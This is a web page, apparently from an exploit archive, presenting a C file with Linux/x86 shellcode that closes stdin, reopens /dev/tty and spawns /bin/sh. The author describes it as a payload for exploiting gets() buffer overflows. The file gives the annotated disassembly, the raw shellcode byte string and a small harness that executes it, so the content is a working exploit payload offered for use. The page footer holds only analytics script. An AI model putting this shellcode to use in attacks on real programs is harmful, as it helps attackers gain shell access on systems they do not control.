<html><head><title>Linux/x86 - stdin re-open and /bin/sh execute</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $
 *
 * gets-linux.c - stdin re-open shellcode for Linux/x86
 * Copyright (c) 2003 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
 *
 * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin 
 * descriptor and re-opens /dev/tty, then does an execve() of /bin/sh.
 * Useful to exploit some gets() buffer overflows in an elegant way...
 */

/*
 * close(0) 
 *
 * 8049380:       31 c0                   xor    %eax,%eax
 * 8049382:       31 db                   xor    %ebx,%ebx
 * 8049384:       b0 06                   mov    $0x6,%al
 * 8049386:       cd 80                   int    $0x80
 *
 * open(&quot;/dev/tty&quot;, O_RDWR | ...)
 *
 * 8049388:       53                      push   %ebx
 * 8049389:       68 2f 74 74 79          push   $0x7974742f
 * 804938e:       68 2f 64 65 76          push   $0x7665642f
 * 8049393:       89 e3                   mov    %esp,%ebx
 * 8049395:       31 c9                   xor    %ecx,%ecx
 * 8049397:       66 b9 12 27             mov    $0x2712,%cx
 * 804939b:       b0 05                   mov    $0x5,%al
 * 804939d:       cd 80                   int    $0x80
 *
 * execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)
 *
 * 804939f:       31 c0                   xor    %eax,%eax
 * 80493a1:       50                      push   %eax
 * 80493a2:       68 2f 2f 73 68          push   $0x68732f2f
 * 80493a7:       68 2f 62 69 6e          push   $0x6e69622f
 * 80493ac:       89 e3                   mov    %esp,%ebx
 * 80493ae:       50                      push   %eax
 * 80493af:       53                      push   %ebx
 * 80493b0:       89 e1                   mov    %esp,%ecx
 * 80493b2:       99                      cltd   
 * 80493b3:       b0 0b                   mov    $0xb,%al
 * 80493b5:       cd 80                   int    $0x80
 */

char sc[] = 
&quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80&quot;
&quot;\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80&quot;
&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;;

main()
{
	int (*f)() = (int (*)())sc; f();
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
